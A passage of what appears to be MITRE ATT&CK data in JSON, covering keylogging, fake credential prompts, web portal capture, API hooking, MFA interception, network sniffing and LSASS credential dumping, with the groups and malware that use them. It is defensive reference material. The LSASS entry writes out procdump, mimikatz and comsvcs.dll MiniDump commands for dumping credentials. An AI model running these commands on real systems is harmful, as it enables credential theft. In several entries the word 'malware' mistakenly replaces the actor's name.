                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "<name> contains a keylogger.[161]"
                    },
                    "S0332": {
                        "ID": "S0332",
                        "Name": "Remcos",
                        "Description": "<name> has a command for keylogging.[162][163]"
                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> gathers and exfiltrates keystrokes from the machine.[164]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> contains a keylogger component.[165][166]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> has a plugin for keylogging.[167][168]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> can use  SetWindowsHookEx and GetKeyNameText to capture keystrokes.[169][170]"
                    },
                    "S0090": {
                        "ID": "S0090",
                        "Name": "Rover",
                        "Description": "<name> has keylogging functionality.[171]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> can record keystrokes from both the keyboard and virtual keyboard.[172][173]"
                    },
                    "S0253": {
                        "ID": "S0253",
                        "Name": "RunningRAT",
                        "Description": "<name> captures keystrokes and sends them back to the C2 server.[174]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.[175]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> has a keylogging capability.[176]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> has a keylogging capability.[177]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> can continuously capture keystrokes.[178][179]"
                    },
                    "G0054": {
                        "ID": "G0054",
                        "Name": "Sowbug",
                        "Description": "<name> has used keylogging tools.[180]"
                    },
                    "S0058": {
                        "ID": "S0058",
                        "Name": "SslMM",
                        "Description": "<name> creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.[181]"
                    },
                    "S0018": {
                        "ID": "S0018",
                        "Name": "Sykipot",
                        "Description": "<name> contains keylogging functionality to steal passwords.[182]"
                    },
                    "S0467": {
                        "ID": "S0467",
                        "Name": "TajMahal",
                        "Description": "<name> has the ability to capture keystrokes on an infected host.[183]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> uses the CGEventTap functions to perform keylogging.[184]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> actors installed a credential logger on Microsoft Exchange servers. <name> also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.[89][185][186]"
                    },
                    "S0004": {
                        "ID": "S0004",
                        "Name": "TinyZBot",
                        "Description": "<name> contains keylogger functionality.[187]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has used keylogging tools in their operations.[188]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can capture keystrokes on a compromised host.[189]"
                    },
                    "S0130": {
                        "ID": "S0130",
                        "Name": "Unknown Logger",
                        "Description": "<name> is capable of recording keystrokes.[31]"
                    },
                    "S0257": {
                        "ID": "S0257",
                        "Name": "VERMIN",
                        "Description": "<name> collects keystrokes from the victim machine.[190]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> has the capability to install a live and offline keylogger, including through the use of the GetAsyncKeyState Windows API.[191][192]"
                    },
                    "S0161": {
                        "ID": "S0161",
                        "Name": "XAgentOSX",
                        "Description": "<name> contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.[193]"
                    },
                    "S0248": {
                        "ID": "S0248",
                        "Name": "yty",
                        "Description": "<name> uses a keylogger plugin to gather keystrokes.[194]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> can perform keylogging on the victim\u2019s machine by hooking the functions TranslateMessage and WM_KEYDOWN.[195]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has a feature to capture a remote computer's keystrokes using a keylogger.[24][196]"
                    }
                }
            },
            "002": {
                "name": "GUI Input Capture",
                "href": "/techniques/T1056/002",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.[1] This type of prompt can be used to collect credentials via various languages such as AppleScript[2][3][4] and PowerShell.[2][5][4] On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell).[4]Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "Procedure": {
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> prompts the user for their credentials.[6]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> presents an input prompt asking for the user's login and password.[7]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> prompts the user for credentials.[8]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has presented victims with spoofed Windows Authentication prompts to collect their credentials.[9][10]"
                    },
                    "S0278": {
                        "ID": "S0278",
                        "Name": "iKitten",
                        "Description": "<name> prompts the user for their credentials.[8]"
                    },
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> prompts the users for credentials.[11]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has displayed fake forms on top of banking sites to intercept credentials from victims.[12]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.[13][14]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> prompts users for their credentials.[8]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name>'s credphisher.py module can prompt a current user for their credentials.[15]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> prompts the user to input credentials using a native macOS dialog box leveraging the system process /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment.[16]"
                    }
                }
            },
            "003": {
                "name": "Web Portal Capture",
                "href": "/techniques/T1056/003",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.[1]",
                "Procedure": {
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered.[2]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "The <name> OWA credential logger can monitor for OWA authentication requests and log the credentials.[3]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled.[4]"
                    },
                    "S1116": {
                        "ID": "S1116",
                        "Name": "WARPWIRE",
                        "Description": "<name> can capture credentials submitted during the web logon process in order to access layer seven applications such as RDP.[5]"
                    }
                }
            },
            "004": {
                "name": "Credential API Hooking",
                "href": "/techniques/T1056/004",
                "description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.[1] Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:Hooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.[2][3]Import address table (IAT) hooking, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.[3][4][5]Inline hooking, which overwrites the first bytes in an API function to redirect code flow.[3][6][5]",
                "Procedure": {
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has hooked several Windows API functions to steal credentials.[7]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> contains some modules that leverage API hooking to carry out tasks, such as netripper.[8]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> hooks processes by modifying IAT pointers to CreateWindowEx.[9][3]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine.[10]"
                    },
                    "G0068": {
                        "ID": "G0068",
                        "Name": "PLATINUM",
                        "Description": "<name> is capable of using Windows hook interfaces for information gathering such as credential access.[11]"
                    },
                    "S0416": {
                        "ID": "S0416",
                        "Name": "RDFSNIFFER",
                        "Description": "<name> hooks several Win32 API functions to hijack elements of the remote system management user-interface.[12]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has the ability to capture RDP credentials by capturing the CredEnumerateA API[13]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers.[14]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> installs an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method.[15]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> hooks processes by leveraging its own IAT hooked functions.[16]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> hooks several API functions to spawn system threads.[17]"
                    }
                }
            }
        },
        "tactic": "Collection",
        "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
        "Procedure": {
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has utilized tools to capture mouse movements.[1]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has a module to perform any API hooking it desires.[2]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware can collect mouse events.[3]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host.[4][5]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can conduct mouse event logging.[6]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can log mouse events.[6]"
            }
        }
    },
    "T1111": {
        "ttp_name": "Multi-Factor Authentication Interception",
        "ttp_id": "T1111",
        "href": "/techniques/T1111",
        "tactic": "Credential Access",
        "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. [1]Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). [2]Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.[3]",
        "Procedure": {
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.[4]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used a proprietary tool to intercept one time passwords required for two-factor authentication.[5]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval.[6]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used a custom collection method to intercept two-factor authentication soft tokens.[7]"
            },
            "S1104": {
                "ID": "S1104",
                "Name": "SLOWPULSE",
                "Description": "malware can log credentials on compromised Pulse Secure VPNs during the DSAuth::AceAuthServer::checkUsernamePasswordACE-2FA authentication procedure.[8]"
            },
            "S0018": {
                "ID": "S0018",
                "Name": "Sykipot",
                "Description": "malware is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.[9]"
            }
        }
    },
    "T1621": {
        "ttp_name": "Multi-Factor Authentication Request Generation",
        "ttp_id": "T1621",
        "href": "/techniques/T1621",
        "tactic": "Credential Access",
        "description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.Adversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).[1]In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \"MFA fatigue.\"[2][3][4]",
        "Procedure": {
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has used repeated MFA requests to gain access to victim accounts.[4][5]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.[6]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval.[7]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.[8]"
            }
        }
    },
    "T1040": {
        "ttp_name": "Network Sniffing",
        "ttp_id": "T1040",
        "href": "/techniques/T1040",
        "tactic": "Credential Access",
        "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities. Adversaries may likely also utilize network sniffing during Adversary-in-the-Middle (AiTM) to passively gain additional knowledge about the environment.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[1][2][3] Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.[4][5] The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.[4]On network devices, adversaries may perform network captures using Network Device CLI commands such as monitor capture.[6][7]",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used BlackEnergy\u2019s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid\u2019s industrial control systems. [8]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[9][10] malware close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.[11]"
            },
            "G0064": {
                "ID": "G0064",
                "Name": "APT33",
                "Description": "malware has used SniffPass to collect credentials by sniffing network traffic.[12]"
            },
            "G0105": {
                "ID": "G0105",
                "Name": "DarkVishnya",
                "Description": "malware used network sniffing to obtain login data. [13]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has been observed to hook network APIs to monitor network traffic. [14]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can be used to conduct packet captures on target hosts.[15]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.[16]"
            },
            "S0357": {
                "ID": "S0357",
                "Name": "Impacket",
                "Description": "malware can be used to sniff network traffic via an interface or raw socket.[17]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.[18][19]"
            },
            "S0443": {
                "ID": "S0443",
                "Name": "MESSAGETAP",
                "Description": "malware uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  [20]"
            },
            "S0590": {
                "ID": "S0590",
                "Name": "NBTscan",
                "Description": "malware can dump and print whole packet content.[21][22]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "malware can sniff network traffic to look for packets matching specific conditions.[23][24]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains a module for taking packet captures on compromised hosts.[25]"
            },
            "S0019": {
                "ID": "S0019",
                "Name": "Regin",
                "Description": "malware appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.[26]"
            },
            "S0174": {
                "ID": "S0174",
                "Name": "Responder",
                "Description": "malware captures hashes and credentials that are sent to the system after the name services have been poisoned.[27]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used intercepter-NG to sniff passwords in network traffic.[28]"
            }
        }
    },
    "T1003": {
        "ttp_name": "OS Credential Dumping",
        "ttp_id": "T1003",
        "href": "/techniques/T1003",
        "subtechnique": {
            "001": {
                "name": "LSASS Memory",
                "href": "/techniques/T1003/001",
                "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:procdump -ma lsass.exe lsass_dumpLocally, mimikatz can be run using:sekurlsa::Minidump lsassdump.dmpsekurlsa::logonPasswordsBuilt-in Windows tools such as comsvcs.dll can also be used:rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full[1][2]Similar to Image File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump of lsass.exe through Windows Error Reporting (WerFault.exe).[3]Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[4]The following SSPs can be used to access credentials:Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.[5]Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.[5]",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used Mimikatz to capture and use legitimate credentials.[6]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has been known to use credential dumping using Mimikatz.[7]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[8][9] They have also dumped the LSASS process memory using the MiniDump function.[10]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\"[11]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.[12][13]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials.[14][15]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.[16]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has used hashdump, Mimikatz, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.[17][18]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes. <name> has also dumped clear text passwords and hashes from memory using Mimikatz hosted through an RDP mapped drive.[19]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has attempted to harvest credentials through LSASS memory dumping.[20]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name> has used Mimikatz to harvest credentials from the victim's machine.[21]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used Mimikatz to retrieve credentials from LSASS memory.[22]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used various tools (such as Mimikatz and WCE) to perform credential dumping.[23]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials.[24]"
                    },
                    "G0003": {
                        "ID": "G0003",
                        "Name": "Cleaver",
                        "Description": "<name> has been known to dump credentials using Mimikatz and Windows Credential Editor.[25]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can spawn a job to inject into LSASS memory and dump password hashes.[26]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "<name> has executed Mimikatz to harvest stored credentials from the victim and further victim penetration.[27]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used Task Manager to dump LSASS memory from Windows devices to disk.[28]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> leverages Mimikatz and Windows Credential Editor to steal credentials.[29]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process.[30]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed dropping password grabber modules including Mimikatz. [31]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> contains an implementation of Mimikatz to gather credentials from memory.[32]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with Mimikatz.[33][34]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used Windows Credential Editor for credential dumping.[35][36]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).[37]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used prodump to dump credentials from LSASS.[38]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines.[39][40]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> has a module for Mimikatz to collect Windows credentials from the victim\u2019s machine.[41]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used procdump to dump the LSASS process memory.[42][1][43]"
                    },
                    "S0357": {
                        "ID": "S0357",
                        "Name": "Impacket",
                        "Description": "SecretsDump and Mimikatz modules within <name> can perform credential dumping to obtain account and password information.[44]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> used Cobalt Strike to carry out credential dumping using ProcDump.[45]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has dumped credentials, including by using Mimikatz.[46][47][48]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has gathered credentials using Mimikatz and ProcDump.[49][50][51]"
                    },
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can perform credential dumping from memory to obtain account and password information.[52]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used several tools for retrieving login and password information, including LaZagne and Mimikatz.[53]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used publicly available tools to dump password hashes, including ProcDump and WCE.[54]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> can run Mimikatz to harvest credentials.[55][56]"
                    },
                    "S0121": {
                        "ID": "S0121",
                        "Name": "Lslsass",
                        "Description": "<name> can dump active logon session password hashes from the lsass process.[7]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can dump password hashes from LSASS.exe.[57]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz.[58][59][60][61]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name> performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.[62][63][64][65]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has performed credential dumping with Mimikatz and procdump64.exe.[66][67][68]"
                    },
                    "S0056": {
                        "ID": "S0056",
                        "Name": "Net Crawler",
                        "Description": "<name> uses credential dumpers such as Mimikatz and Windows Credential Editor to extract cached credentials from Windows systems.[25]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> contains a modified version of Mimikatz to help gather credentials that are later used for lateral movement.[69][70][65]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[71][72][58][73]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> was seen using MimikatzLite to perform credential dumping.[74]"
                    },
                    "S0365": {
                        "ID": "S0365",
                        "Name": "Olympic Destroyer",
                        "Description": "<name> contains a module that tries to obtain credentials from LSASS, similar to Mimikatz. These credentials are used with PsExec and Windows Management Instrumentation to help the malware propagate itself across a network.[75]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
